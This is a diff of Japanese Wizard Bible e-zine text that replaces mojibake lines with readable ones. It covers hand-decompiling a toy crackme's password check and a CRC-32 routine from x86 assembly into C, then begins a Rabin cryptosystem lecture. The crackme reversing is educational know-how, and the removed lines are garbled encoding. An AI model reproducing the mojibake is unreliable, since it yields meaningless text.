-���Ă��邽�߁AMessageBox�֐����Ă΂�邱�Ƃ������ł��A�ǂ���̕������
-�\�����邩�ɂ��A���򂵂Ă��܂��B
+　さらに、PUSHにより「MB_OK|MB_APPLMODAL」と「"Message"」がスタックへ入れ
+られているため、MessageBox関数が呼ばれることが推測でき、どちらの文字列を
+表示するかにより、分岐しています。
 
 -----  sample01.exe
 0040102B  |.  68 18514000   PUSH OFFSET Text = "you are wonderful!"
@@ -1451,11 +1451,11 @@ else
 00401054  \.  C3            RETN
 -----
 
-�@lstrcmp�֐��̖߂�l��0����Ȃ���΁AJNZ���߂ɂ��A�A�h���X�u00401040�v
-�ɏ������ڂ�܂��B����ƁA�u"password is not correct!"�v��PUSH����AMess
-ageBoxA�֐����Ă΂�܂��B�t�ɁAlstrcmp�֐��̖߂�l��0�Ȃ�΁A�u"you are 
-wonderful!"�v��PUSH����AMessageBoxA�֐����Ă΂�܂��B
-�@�����̌��ʂ����킹��ƁA�ȉ���C����R�[�h���L�q�ł��܂��B
+　lstrcmp関数の戻り値が0じゃなければ、JNZ命令により、アドレス「00401040」
+に処理が移ります。すると、「"password is not correct!"」がPUSHされ、Mess
+ageBoxA関数が呼ばれます。逆に、lstrcmp関数の戻り値が0ならば、「"you are 
+wonderful!"」がPUSHされ、MessageBoxA関数が呼ばれます。
+　これらの結果を合わせると、以下のC言語コードが記述できます。
 
 -----  sample01.cpp
 if(x < 2)
@@ -1469,9 +1469,9 @@ if(lstrcmp(y, "wizardbible") == 0){
 }
 -----
 
-�@����ɁAx��ESP+4����擾����Ay��ESP+8����擾����Ă��邽�߁A���ꂼ��
-���������ɓ���ꂽ���̂ł��ˁB�܂�A�֐��͈ȉ��̂悤�ȃR�[�h���ƍl����
-��܂��B
+　さらに、xはESP+4から取得され、yはESP+8から取得されているため、それぞれ
+引数を元に得られたものですね。つまり、関数は以下のようなコードだと考えら
+れます。
 
 -----  sample01.cpp
 int function(int x, void **z)
@@ -1489,19 +1489,19 @@ int function(int x, void **z)
 }
 -----
 
-�@�����̊����I�ɁAmain�֐����ۂ��ł��ˁi����main�֐��ł����c�j�B
-�@���̂悤�ɁA���ԂɃA�Z���u���R�[�h��ǂ�ł����ƁAC����̃R�[�h�ɕϊ���
-�邱�Ƃ��ł��܂��B
+　引数の感じ的に、main関数っぽいですね（事実main関数ですが…）。
+　このように、順番にアセンブルコードを読んでいくと、C言語のコードに変換す
+ることができます。
 
 
-��0x03.) �A���S���Y�����蓮�Ńf�R���p�C��
+■0x03.) アルゴリズムを手動でデコンパイル
 
-�@�ȒP��crackme���蓮�Ńf�R���p�C�����܂������A���́A���̂悤��API�֐���
-�K���K���Ăяo����Ă���悤�ȂƂ�����f�R���p�C������@��́A���܂肠��
-�܂���B�Ȃ��Ȃ�A�f�R���p�C�����Ȃ��Ƃ���̂̓��삪�����邩��ł��B
-�@�蓮�ł̃f�R���p�C�����K�v�ȂƂ���́A�A���S���Y���I�ȏ������s���Ă���
-�����������ł��B
-�@�Ⴆ�΁A�ȉ��̃R�[�h�����Ă��������B
+　簡単なcrackmeを手動でデコンパイルしましたが、実は、このようにAPI関数が
+ガンガン呼び出されているようなところをデコンパイルする機会は、あまりあり
+ません。なぜなら、デコンパイルしなくとも大体の動作が分かるからです。
+　手動でのデコンパイルが必要なところは、アルゴリズム的な処理を行っている
+部分が多いです。
+　例えば、以下のコードを見てください。
 
 -----  sample02.exe
 00401000 >/$  8B4C24 08     MOV ECX,DWORD PTR SS:[ESP+8]
@@ -1568,8 +1568,8 @@ int function(int x, void **z)
 0040109C  \.  C3            RETN
 -----
 
-�@���āA����͊ȒP�ȁu����v�Z���s���A���S���Y���v�ł��B������蓮�Ńf�R
-���p�C�����AC����ɕϊ����܂��傤�B
+　さて、これは簡単な「ある計算を行うアルゴリズム」です。これを手動でデコ
+ンパイルし、C言語に変換しましょう。
 
 -----  sample02.exe
 00401000 >/$  8B4C24 08     MOV ECX,DWORD PTR SS:[ESP+8]
@@ -1578,11 +1578,11 @@ int function(int x, void **z)
 00401009  |.  0F84 8B000000 JE sample02.0040109A
 -----
 
-�@�ŏ���2�s�ŁA2�Ԗڂ̈�����ECX�֓���āAEAX��0xFFFFFFFF�ɂ��Ă��܂��B��
-��ɁAECX�i2�Ԗڂ̈����j��0�Ȃ�u0040109A�v�փW�����v���܂��B�܂�A2��
-�ڂ̈�����0���Ɓu�G���[�v�Ƃ����킯�ł��B����ɁA�A�h���X�u0040109A�v��
-�uNOT EAX�v�Ȃ̂ŁAEAX�̒l�����]���A0xFFFFFFFF����0x00000000�֕ύX�����
-���B
+　最初の2行で、2番目の引数をECXへ入れて、EAXを0xFFFFFFFFにしています。さ
+らに、ECX（2番目の引数）が0なら「0040109A」へジャンプします。つまり、2番
+目の引数が0だと「エラー」というわけです。さらに、アドレス「0040109A」は
+「NOT EAX」なので、EAXの値が反転し、0xFFFFFFFFから0x00000000へ変更されま
+す。
 
 -----  sample02.exe
 0040100F  |.  8B5424 04     MOV EDX,DWORD PTR SS:[ESP+4]
@@ -1592,16 +1592,16 @@ int function(int x, void **z)
 00401019  |.  42            |INC EDX
 -----
 
-�@1�Ԗڂ̈�����EDX�֓���܂��B�A�h���X�u00401014�v�ŁAEDX�̓A�h���X���Q��
-���Ă��邽�߁AEDX�̓|�C���^�ł��B
-�@�A�h���X�u00401013�v�ōs���Ă�uPUSH ESI�v�́A���̊֐���ESI���W�X�^���g
-�����߁A����ESI�ɓ����Ă���l���X�^�b�N�ֈꎞ�I�ɕۑ��i�o�b�N�A�b�v�j����
-���������ł��B�֐��̍Ō�ł܂��X�^�b�N����ESI�𕜌����܂��B
-�@�A�h���X�u00401014�v��MOVZX���߂́A�T�C�Y���Ⴄ���W�X�^�֒l��]�����܂��B
-EDX���w���l��1�o�C�g�������AESI�֓�����܂��B�����āAESI��EAX��XOR����
-�܂��BEAX��0xFFFFFFFF�ł��ˁB�����EDX���C���N�������g�ł��BEDX�̓|�C���^
-�Ȃ̂ŁA���̒l���w�����ƂɂȂ�܂��B
-�@�ł́A�����܂ł��AC����̃\�[�X�R�[�h�ɂ��܂��B
+　1番目の引数をEDXへ入れます。アドレス「00401014」で、EDXはアドレスを参照
+しているため、EDXはポインタです。
+　アドレス「00401013」で行ってる「PUSH ESI」は、この関数でESIレジスタを使
+うため、現在ESIに入っている値をスタックへ一時的に保存（バックアップ）して
+おく処理です。関数の最後でまたスタックからESIを復元します。
+　アドレス「00401014」のMOVZX命令は、サイズが違うレジスタへ値を転送します。
+EDXが指す値が1バイト分だけ、ESIへ入れられます。そして、ESIはEAXとXORされ
+ます。EAXは0xFFFFFFFFですね。さらにEDXをインクリメントです。EDXはポインタ
+なので、次の値を指すことになります。
+　では、ここまでを、C言語のソースコードにします。
 
 -----  sample02-1.cpp
 int function(char *x, int y)
@@ -1615,11 +1615,11 @@ int function(char *x, int y)
     x++;
 -----
 
-�@�֐����A�߂�l������̌^�͓K���ł��B�Ƃ肠�����A���̏������d�v�ł��B��
-���A���̏��������[�v�Ȃǂ͂܂��v�Z���Ă��Ȃ����߁A���̂܂܏����������Ă�
-�邾���ł��B����ύX�����\��������܂��B�����A���󕪂����Ă���i�K��
-�͂����܂ŏ����܂��B
-�@�ł́A���֐i�݂܂��B
+　関数名、戻り値や引数の型は適当です。とりあえず、中の処理が重要です。ま
+た、中の処理もループなどはまだ計算していないため、そのまま処理を書いてい
+るだけです。今後変更される可能性があります。ただ、現状分かっている段階で
+はここまで書けます。
+　では、次へ進みます。
 
 -----  sample02.exe
 0040101A  |.  A8 01         |TEST AL,1
@@ -1630,9 +1630,9 @@ int function(char *x, int y)
 00401024  |.  35 2083B8ED   |XOR EAX,EDB88320
 -----
 
-�@�ŏ���TEST���߂ɂ��AEAX�̍ŏ���1�r�b�g��ON��OFF���ɂ���ď�����������
-�܂��B��������A�ȉ��̃R�[�h���Č��ł��܂��B�����́Axor��V�t�g���Z�Ȃ̂ŁA
-�R�[�h�����₷����������܂���B
+　最初のTEST命令により、EAXの最初の1ビットがONかOFFかによって処理が分かれ
+ます。ここから、以下のコードが再現できます。ここは、xorやシフト演算なので、
+コード化しやすいかもしれません。
 
 -----  sample02-2.cpp
     if(a & 1){
@@ -1643,7 +1643,7 @@ int function(char *x, int y)
     }
 -----
 
-�@�ł́A����ǂݐi�߂܂��B
+　では、次を読み進めます。
 
 -----  sample02.exe
 00401029  |>  A8 01         |TEST AL,1
@@ -1654,7 +1654,7 @@ int function(char *x, int y)
 00401033  |.  35 2083B8ED   |XOR EAX,EDB88320
 -----
 
-�@�O��ƃR�[�h�������ł��B
+　前回とコードが同じです。
 
 -----  sample02-3.cpp
     if(a & 1){
@@ -1665,7 +1665,7 @@ int function(char *x, int y)
     }
 -----
 
-�@����Ɏ��֐i�݂܂��B
+　さらに次へ進みます。
 
 -----  sample02.exe
 00401038  |>  A8 01         |TEST AL,1
@@ -1676,11 +1676,11 @@ int function(char *x, int y)
 00401042  |.  35 2083B8ED   |XOR EAX,EDB88320
 -----
 
-�@�܂��܂��A�R�[�h�������ł��B
-�@�悭���Ă����ƁA�A�h���X�u0040108D�v�܂ŁA�����R�[�h�������܂��B������
-��A���̂܂܁u0040108D�v�܂ŁA��L��C����R�[�h�������Ă��悢�̂ł����A��
-������C����ɒ����̂ŁA�����ǂ݂₷�����܂��B�A�h���X�u0040108D�v�܂�8��A
-�����R�[�h���J��Ԃ���邽�߁Afor�����g���āA�������ȗ������܂��B
+　またまた、コードが同じです。
+　よく見ていくと、アドレス「0040108D」まで、同じコードが続きます。もちろ
+ん、このまま「0040108D」まで、上記のC言語コードを書いてもよいのですが、せ
+っかくC言語に直すので、少し読みやすくします。アドレス「0040108D」まで8回、
+同じコードが繰り返されるため、for文を使って、処理を簡略化します。
 
 -----  sample02-4.cpp
     for(int i=0; i < 8; i++)
@@ -1694,7 +1694,7 @@ int function(char *x, int y)
     }
 -----
 
-�@�����āA�Ō�̃��[�`���ł��B
+　そして、最後のルーチンです。
 
 -----  sample02.exe
 00401092  |>  49            |DEC ECX
@@ -1704,10 +1704,10 @@ int function(char *x, int y)
 0040109C  \.  C3            RETN
 -----
 
-�@ECX�����Z���Ă��܂����A���̒l�͂��̊֐��֓n������2�����ł��B�����āA
-ECX��0�łȂ��Ȃ�΁A�܂��A�h���X�u00401014�v�֖߂�A����܂łƓ���������
-�J��Ԃ���܂�
-�@�ł́A�\�[�X�S�̂����������܂��傤�B
+　ECXを減算していますが、この値はこの関数へ渡される第2引数です。そして、
+ECXが0でないならば、またアドレス「00401014」へ戻り、これまでと同じ処理が
+繰り返されます
+　では、ソース全体を完成させましょう。
 
 -----  sample02.cpp
 unsigned long function(char *x, int y)
@@ -1742,37 +1742,37 @@ unsigned long function(char *x, int y)
 }
 -----
 
-�@�A�Z���u���R�[�h�����ɐ������Ă��邽�߁A���ۂ̃R�[�h�Ƃ͈قȂ��Ă��邩
-������܂��񂪁A�o�͌��ʂ͓����ł��B�����f�R���p�C�����o���Ă��܂��B����
-�݂ɂ��̃R�[�h�́A�f�[�^��CRC�����߂�֐��ł��B�����m�荇���ɋ����Ă����
-���R�[�h�Łu����ȒP���ȏ�����CRC�����߂���̂��v�Ə�����������܂����B
+　アセンブルコードを元に生成しているため、実際のコードとは異なっているか
+もしれませんが、出力結果は同じです。無事デコンパイルが出来ています。ちな
+みにこのコードは、データのCRCを求める関数です。私も知り合いに教えてもらっ
+たコードで「こんな単純な処理でCRCが求められるのか」と少し驚かされました。
 
 
-��0x04.) ��������
+■0x04.) さいごに
 
-�@����Acrackme��CRC�A���S���Y���̃R�[�h���蓮�Ńf�R���p�C�����܂������A
-�������������ł��傤���H�@crackme�͊֐��Ăяo���̗���ɂ���̂̃R�[�h��
-�����邽�߁A���₷��������������܂��񂪁A�A���S���Y���n�́A����������
-������Ă���̂��ŏ��͌��������Ȃ����߁A�{���Ɏ����̗������������̂��s
-���ɂȂ�܂��B�������A�ŏ��͊Ԉ���Ă����Ƃ��Ă��A�ǂݐi�߂Ă����ΑS�̑�
-������ɒ͂߂Ă����̂ŁA�Ƃ肠�����u�ǂނ��Ɓv���d�v���Ǝv���܂��B
-�@�܂��A�A�Z���u���R�[�h��ǂނ��Ƃ͉�͂̊�b�Ȃ̂ŁA�������m�ɓǂ߂邱
-�Ƃ́A���ꂾ���ŋZ�p�ɂȂ�܂��B����ɁA�ǂދZ�p�͉����o�����d�v�ł���
-�ŁA�L�΂����߂ɂ́A�����̒n���Ȑςݏd�˂��K�v��������܂���B
-�@����ȂƂ���ō���͏I���Ƃ����Ă��������܂��B
+　今回、crackmeとCRCアルゴリズムのコードを手動でデコンパイルしましたが、
+いかがだったでしょうか？　crackmeは関数呼び出しの流れにより大体のコードが
+分かるため、やりやすかったかもしれませんが、アルゴリズム系は、いったい何
+をやっているのか最初は検討がつかないため、本当に自分の理解が正しいのか不
+安になります。しかし、最初は間違っていたとしても、読み進めていけば全体像
+が次第に掴めていくので、とりあえず「読むこと」が重要だと思います。
+　また、アセンブルコードを読むことは解析の基礎なので、速く正確に読めるこ
+とは、それだけで技術になります。それに、読む技術は何より経験が重要ですの
+で、伸ばすためには、毎日の地道な積み重ねが必要かもしれません。
+　そんなところで今回は終わりとさせていただきます。
 
 
-��0x05.) �������̂�������
+■0x05.) さいごのさいごに
 
-�@�ȉ��̃R�[�h�́A����Ȃ�ɗL���Ȃ���A���S���Y���ł��B2�̊֐��Ŏ�����
-��Ă��܂��i00401000��00401100�j�B�����ǂ�������r�����Ƀf�R���p�C���ɒ�
-�킵�Ă݂Ă��������B�����A�����̃A���S���Y���Ȃ̂ŁA���肳���ł�����A��
-���炭�C���^�[�l�b�g��œ��l�̃\�[�X�R�[�h�������邩�Ǝv���܂��B�Ȃ̂ŁA
-�S���f�R���p�C������K�v�͂Ȃ��ł��傤�B
-�@���X�A���S���Y����m���Ă�l�i�����ҁH�j�Ȃ�A��u�ŕ����邩�Ǝv���܂�
-���A�m��Ȃ��l�Łu���Ⴀ�R�[�h��ǂ�ŉ�͂��悤�I�v�ƂȂ�ƁA2�`3���Ԃ�
-�炢�͂����邩�Ǝv���܂��i���Ԃ�j�B�l�I�ɂ́A��������ĕ�����Ώ\����
-�������̂ł́H�@�Ǝv���Ă܂��B
+　以下のコードは、それなりに有名なあるアルゴリズムです。2つの関数で実装さ
+れています（00401000と00401100）。もし良かったら腕試しにデコンパイルに挑
+戦してみてください。ただ、既存のアルゴリズムなので、特定さえできたら、お
+そらくインターネット上で同様のソースコードが見つかるかと思います。なので、
+全部デコンパイルする必要はないでしょう。
+　元々アルゴリズムを知ってる人（研究者？）なら、一瞬で分かるかと思います
+が、知らない人で「じゃあコードを読んで解析しよう！」となると、2〜3時間く
+らいはかかるかと思います（たぶん）。個人的には、一日かけて分かれば十分に
+すごいのでは？　と思ってます。
 
 -----  sample03.exe
 00401000 >/$  53            PUSH EBX
@@ -1905,326 +1905,326 @@ unsigned long function(char *x, int y)
 0040116C  \>  C3            RETN
 -----
 
-�@�����@�����΁A�񓚕҂���邩������܂���(^^;�B
-�@�ł͂ł́[�B
+　もし機会があれば、回答編もやるかもしれません(^^;。
+　ではではー。
 
 
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��6��: ��b�Í��w�u���E��17�� �`Rabin�Í��` ---
+--- 第6章: 基礎暗号学講座・第17回 〜Rabin暗号〜 ---
 
-���ҁFIPUSIRON
+著者：IPUSIRON
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x01.) �͂��߂�
+■0x01.) はじめに
 
-�@�O��͊g��ElGamal�Í����Љ���B����͈��������Č��J���Í��̈��ł���
-Rabin�Í����Љ��B
+　前回は拡張ElGamal暗号を紹介した。今回は引き続いて公開鍵暗号の一種である
+Rabin暗号を紹介する。
 
 
-��0x02.) ���w�I����
+■0x02.) 数学的準備
 
-�@���łɉ���������w�I�T�O������܂����A���ɏd�v�Ȃ��̂����߂ĉ�����Ă�
-���B
+　すでに解説した数学的概念もありますが、特に重要なものを改めて解説してお
+く。
 
-��Z_N
+●Z_N
 
-�@Z�͐����̏W���ł���AZ_N�Ə������ꍇ�͖@��N�Ƃ����Ƃ���Z�̏W���ł���B
-�܂�AZ_N={0,1,2,�c,N-1}�ł���B
+　Zは整数の集合であり、Z_Nと書いた場合は法をNとしたときのZの集合である。
+つまり、Z_N={0,1,2,…,N-1}である。
 
-��GCD
+●GCD
 
-�@GCD�iGreatest Common Division�j�́A�ő���񐔂��Ӗ�����Ba��b�̌��񐔂�
-�������ꍇ��a��b�ɋ��ʂ���񐔂̂��Ƃł���A�ő���񐔂Ƃ͍ő�̌��񐔂�
-���Ƃł���Ba,b�̍ő���񐔂�GCD(a,b)�ƕ\�L�����B
-�@�Ⴆ�΁AGCD(12,10)��2�ł���B�Ȃ��Ȃ��12=2�E2�E3�A10=2�E5�ł���A12��
-10�̌��񐔂�2���������Ȃ�����ł���B
+　GCD（Greatest Common Division）は、最大公約数を意味する。aとbの公約数と
+いった場合はaとbに共通する約数のことであり、最大公約数とは最大の公約数の
+ことである。a,bの最大公約数はGCD(a,b)と表記される。
+　例えば、GCD(12,10)は2である。なぜならば12=2・2・3、10=2・5であり、12と
+10の公約数は2しか持たないからである。
 
-�@���[�N���b�h�̌ݏ��@�ƌĂ΂��L���ȃA���S���Y����p���邱�ƂŁA�@�B�I
-��GCD���v�Z���邱�Ƃ��ł���B
+　ユークリッドの互除法と呼ばれる有名なアルゴリズムを用いることで、機械的
+にGCDを計算することができる。
 
-��CRT�i�����l��]�藝�j
+●CRT（中国人剰余定理）
 
-�@m1,m2,�c,m_r�F�e�X���݂��ɑf�Aa1,a2,�c,a_r��Z�Ƃ���B
-�@���̂Ƃ��A����r�̍������𖞂���x��M=��[i=1;r]m_i��@�Ƃ��Ă����ЂƂ�
-�������݂���B
+　m1,m2,…,m_r：各々が互いに素、a1,a2,…,a_r∈Zとする。
+　このとき、次のr個の合同式を満たすxはM=Π[i=1;r]m_iを法としてただひとつ
+だけ存在する。
 
-x��a1 (mod m1)
-x��a2 (mod m2)
-�c
-x��a_r (mod m_r)
+x≡a1 (mod m1)
+x≡a2 (mod m2)
+…
+x≡a_r (mod m_r)
 
-�@����ɁAM_i=M/m_i�Ay_i=(M_i)^(-1) (mod m_i) (i=1,�c,r)�Ƃ���ƁA���̉�
-x�͎��̒ʂ�ɂȂ�B
+　さらに、M_i=M/m_i、y_i=(M_i)^(-1) (mod m_i) (i=1,…,r)とすると、その解
+xは次の通りになる。
 
-x�߃�[i=1;r]a_i(M_i�Ey_i) (mod M)
+x≡Σ[i=1;r]a_i(M_i・y_i) (mod M)
 
-�@�ȏオCRT�ł���Bm1,m2,�c,m_r���݂��ɑf�ł���Ƃ��݂̂�CRT��p���邱��
-���ł��邱�Ƃɒ��ӂ��ė~�����B
+　以上がCRTである。m1,m2,…,m_rが互いに素であるときのみにCRTを用いること
+ができることに注意して欲しい。
 
-�@�����ł͉��̑��݂Ɖ��̈�Ӑ��̏ؖ��͏Ȃ��A���l��������B
+　ここでは解の存在と解の一意性の証明は省き、数値例を示す。
 
-��Fx��1 (mod 3)�Ax��2 (mod 5)�Ax��3 (mod 7)�̘A�����������v�Z����B
+例：x≡1 (mod 3)、x≡2 (mod 5)、x≡3 (mod 7)の連立合同式を計算する。
 
-m1=3,m2=5,m3=7�Ƃ����B
-m1�`m3����������݂��ɑf�ł��邩��ACRT��p���邱�Ƃ��ł���B
+m1=3,m2=5,m3=7とおく。
+m1〜m3がいずれも互いに素であるから、CRTを用いることができる。
 
-M=m1�Em2�Em3=3�E5�E7=105
+M=m1・m2・m3=3・5・7=105
 
-M1=M/m1=m2�Em3=35
-M2=M/m2=m1�Em3=21
-M3=M/m3=m1�Em2=15
+M1=M/m1=m2・m3=35
+M2=M/m2=m1・m3=21
+M3=M/m3=m1・m2=15
 
 y1=(M1)^(-1) mod m1=35^(-1) mod 3=2^(-1) mod 3=2 mod 3
 y2=(M2)^(-1) mod m2=21^(-1) mod 5=1 mod 5
 y3=(M3)^(-1) mod m3=15^(-1) mod 7=1 mod 7
 
-M1�Ey1=35�E2=70
-M2�Ey2=21�E1=21
-M3�Ey3=15�E1=15
+M1・y1=35・2=70
+M2・y2=21・1=21
+M3・y3=15・1=15
 
-x=a1�EM1+a2�EM2�{a3�EM3=1�E70+2�E21�{3�E15=70+42+45 mod M��52 mod 105
+x=a1・M1+a2・M2＋a3・M3=1・70+2・21＋3・15=70+42+45 mod M≡52 mod 105
 
-��x=[a,b]
+●x=[a,b]
 
-�@p,q��f���AN=pq�Ƃ���B���̂Ƃ��ux��a (mod p)�v���ux��b (mod q)�v��
-����x��Z_N���Ax=[a,b]�ƋL�q����B
+　p,qを素数、N=pqとする。このとき「x≡a (mod p)」かつ「x≡b (mod q)」を満
+たすx∈Z_Nを、x=[a,b]と記述する。
 
-�@x=[a,b]����̓I�ɋ��߂邽�߂ɂ́ACRT��p����΂悢�B
-
-
-��0x03.) Rabin�Í��̒�`
-
-�@���J���Í��͌������A���S���Y���E�Í����A���S���Y���E�����A���S���Y����
-3�̃A���S���Y���ō\�������Ƃ������Ƃ�WB34�Ő��������B����Љ��Rab
-in�Í������J���Í��̈��Ȃ̂ŁA3�̃A���S���Y������\�������B
-
-���������A���S���Y���iKeyGen�j
-
-1�F�Z�L�����e�B�p�����[�^1^k����͂Ƃ���B
-
-2�F�傫�ȑf��p,q�𐶐�����B
-
-3�FN=pq���v�Z����B
-
-4�Fpk=N�Ask=(p,q)���o�͂���B
-
-���Í����A���S���Y���iEnc�j
-
-1�Fpk=N�Am��Z_N����͂Ƃ���B
-
-2�Fc��m^2 (mod N)���v�Z����B
-
-3�Fc���o�͂���B
-
-�������A���S���Y���iDec�j
-
-1�Fsk=(p,q)�Ac=m^2����͂Ƃ���B
-
-2�Fx^2��c (mod p)�Ax^2��c (mod q)�̕����������߂�B�����ł͌v�Z���ʂ�x��
-�}a (mod p)�Ax�߁}b (mod q)�Ƃ����B
-
-3�FM1=[a,b]�AM2=[a,-b]�AM3=[-a,b]�AM4=[-a,-b]���v�Z����B
-
-4�FM1�`M4�̂����ꂩ���o�͂���B
-
-���⑫
-
-�@�ȏ�Œ�`����3��KeyGen,Enc,Dec��Rabin�Í��̒�`�ł���B��`�Ƃ͕ʂ�
-���āA�⑫���������Ƃ�����B
-
-�@KeyGen�̃X�e�b�v1�ɂ�����Z�L�����e�B�p�����[�^�Ƃ́A�r�b�g�������߂��
-�̂ł���Bk�ł͂Ȃ��A1^k����͂Ƃ��闝�R�ɂ��ẮA�e�A���S���Y���̓`��
-�[�����O�}�V���ƌĂ΂�郂�f���ōl���Ă��邱�Ƃɑ傫���֌W����B�����ł�
-�`���[�����O�}�V���ɂ��Ă͏Љ�Ȃ����߁AKeyGen�̓��͂͒P�Ƀr�b�g���i
-2�i���̐��E�̌����j���Ӗ����Ă���ƔF�����Ă��炦��΂悢�B
-�@KeyGen�̃X�e�b�v2�ɂ����āAp,q�͒P�ɑ傫�ȑf���Ƃ̂ݎw�肵�Ă���B�{��
-����ẮA�����Ɛ������ꂽ�f����p���Ă���ꍇ������B�����ł͍ł���{�I
-��Rabin�Í��̏Љ�����������߁A�V���v���ȑf���̑I�ѕ��ɂ����B
-�@KeyGen�̃X�e�b�v4�ɂ�����pk�͌��J���Ask�͔閧���ł���B
-
-�@Enc�̃X�e�b�v1�ɂ�����m�͕����A�X�e�b�v3�ɂ�����c�͈Í����ł���B�܂�A
-���J��pk�ƕ���m�ňÍ���c���v�Z���Ă��邱�Ƃ��킩��B
-
-�@Dec�̃X�e�b�v2�ɂ����āA2�̍����������̕����������߂�K�v������B�f��
-��@�Ƃ����ꍇ�͌����I�ɕ��������v�Z�\�ł��邱�Ƃ��m���Ă���̂ŁA��
-��͌����I�Ɍv�Z�\�ł���B
-�@Dec�̃X�e�b�v3�ɂ�����4�̌v�Z�́A���ꂼ��ɑ΂���CRT��K�p������΂�
-���B
-�@Dec�̃X�e�b�v4�ɂ����ĕ�����M1�`M4�̂悤��4�v�Z�����BM1�`M4�̂�����
-�����Ó��ȕ���m�ł��邪�A�Ó��ȕ����ɍi�荞�ނ��߂ɂ͕ʂ̎d�g�݂̏������K
-�v�Ƃ����B���̎d�g�݂Ɋւ���l�@�͂͌�q����B
+　x=[a,b]を具体的に求めるためには、CRTを用いればよい。
 
 
-��0x04.) Rabin�Í� vs. RSA�Í�
+■0x03.) Rabin暗号の定義
 
-�@WB34�ɂ����āi���ȏ��I�jRSA�Í����Љ���B�����ł�Rabin�Í���RSA�Í���
-��r���Ă݂�B
+　公開鍵暗号は鍵生成アルゴリズム・暗号化アルゴリズム・復号アルゴリズムの
+3つのアルゴリズムで構成されるということはWB34で説明した。今回紹介するRab
+in暗号も公開鍵暗号の一種なので、3つのアルゴリズムから構成される。
 
-���A���S���Y��
+●鍵生成アルゴリズム（KeyGen）
 
-�@���K�ɂȂ邪���ȏ��IRSA�Í��̈Í�����m^e (mod N)�ł������B����ARabin��
-���̈Í�����m^2 (mod N)�ł���B���ꂾ���̔�r�ɂ��΁ARabin�Í���e=2�̏�
-����RSA�Í��Ǝv����B�������A�����ł͂Ȃ��B�Ȃ��Ȃ�΁AKeyGen�ɒ��ڂ��Ă�
-�炦�΂悢�B���ȏ��IRSA�Í���KeyGen�ɂ����āA�uGCD((p-1)(q-1),e)=1�v��
-����e�𐶐����Ă���B�܂�A��ɁuGCD((p-1)(q-1),e)=1�v�����藧���Ă���
-�Ƃ������Ƃł���Bp,q�͑f���Ȃ̂ŁA��ł���B
-�@����āAp-1,q-1�͂ǂ���������ł���B(p-1)(q-1)�������ɂȂ邱�Ƃ𓥂܂�
-��ƁAe=2�̂Ƃ��ɁuGCD(e,(p-1)(q-1))=1�v�͐��藧���Ȃ��B�䂦�ɁARabin�Í�
-�͋��ȏ��IRSA�Í��̓���P�[�X�Ƃ����킯�ł��Ȃ����Ƃ��킩��B
-�@�����āARabin�Í���Dec�ł�2���������ł���uc��m^2 (mod N)�v�iN=pq�j��4
-�̉����v�Z�����B�������A�uGCD(e,(p-1)(q-1))��1�v�ł��邽�߂�4����1
-�ɍi�荞�߂Ȃ��̂ł���B
+1：セキュリティパラメータ1^kを入力とする。
 
-�����S��
+2：大きな素数p,qを生成する。
 
-�@���ȏ��IRSA�Í��́ARSA����̉���OW-CPA���S�ł���BOW-CPA�Ƃ����\�L�ɂ�
-���Ă�WB40���Q�Ƃ��ė~�����B
-�@����ARabin�Í��́A�傫�Ȍ��̍������̏ꍇ�͑f��������������ł���Ƃ�
-������i�ȍ~�A�f�������������ƌĂԂ��Ƃɂ���j�̉���OW-CPA���S�ł���B
-Rabin�Í��i1979�N�j��RSA�Í��i1977�N�j�̒�Č�ɔ��\���ꂽ���A���͈��S��
-�ؖ����t�������̌��J���Í��ł���B
+3：N=pqを計算する。
 
-�@RSA�Í��Ƒf���������������r����ƁA��҂̕����ア����ł���B����
-�͎ア�����������ƁAWB39�ŏЉ���B�܂�ARabin�Í���RSA�Í��͈��S����
-�݂ł݂��OW-CPA���S�Ɠ����ł���A����Ō����Rabin�Í��̕�����藝�z�I��
-������B
+4：pk=N、sk=(p,q)を出力する。
 
-��������
+●暗号化アルゴリズム（Enc）
 
-�@���ȏ��IRSA�Í���Enc�ł́Am^e���v�Z����B�܂�Amod n�̐��E�ɂ����镽
-���v�Z�Ə�Z�v�Z���K�v�Ƃ����B���̌v�Z��WB35�ŏЉ���ׂ���v�Z�̃A��
-�S���Y�������p�����B����ɂ��A�P���ɏ�Z������������I�Ɍv�Z�ł���B
-�@����ARabin�Í���Enc�ł́Am^2���v�Z����B�܂�Amod n�̐��E�ɂ����镽
-���v�Z�����ōςށB
-�@����āA�Í����Ɋւ��ẮARabin�Í��̕��������ƌ�����B
+1：pk=N、m∈Z_Nを入力とする。
 
-�@���ȏ��IRSA�Í���Dec�ł́Ac^d���v�Z����B�܂�Amod n�̐��E�ɂ����镽
-���v�Z�Ə�Z�v�Z���K�v�Ƃ����B
-�@����ARabin�Í���Dec�ł́Ax^2��c (mod p)�Ax^2��c (mod q)�̕������A����
-��CRT�̌v�Z���K�v�ł���B
+2：c≡m^2 (mod N)を計算する。
 
-�@�Ƃ���ŁAKeyGen�Ő��������p,q��P���ɑ傫�ȑf���Ƃ���̂ł͂Ȃ��Ap,q
-��@4�̐��E��3�ɂȂ�f���iBlum�����\������p,q�j�ɂ���ƁA�����������Ȃ��
-�����B
+3：cを出力する。
 
-������
+●復号アルゴリズム（Dec）
 
-�@Rabin�Í��͈�Ӑ��̖�肪���݂���B�Í����ł���c mod n�𕜍�����ƁA4��
-�̕����������܂�A����4�̂�����1������������m�ɂȂ�B���������������
-����ɂ͂������̕��@�����݂���B
-�@��������肷��ł��f�p�ȕ��@�́A�������ē���ꂽ4�̒l�̓��e��ǂݎ��A
-���������͂�I�ԂƂ������@�ł���B�������A���������͂ł��邩�������I�Ɏ�
-�ʂ���Ƃ����͈̂�ʂɂ͓���B�������A�m�������Ȃ��B���ꂾ���ł͂Ȃ��A
-�������̂��̂͌���Ƃ��ĈӖ��𐬂��Ƃ͌���Ȃ��B�Ⴆ�΁A���J���Í�������
